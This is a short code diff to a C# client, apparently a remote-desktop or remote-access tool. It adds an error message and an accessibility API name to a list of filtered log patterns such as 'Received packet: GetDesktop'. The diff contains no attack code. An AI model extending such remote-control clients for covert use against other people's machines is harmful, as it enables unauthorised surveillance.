@@ -136,7 +136,9 @@ namespace Pulsar.Client.User
                 "Received packet: GetDesktop",
                 "Capture FPS:",
                 "Buffer size:",
-                "Pending requests:"
+                "Pending requests:",
+                "Value does not fall within the expected range.",
+                "Accessibility.IAccessible.get_accChild"
             };
 
             foreach (var pattern in blacklistedPatterns)
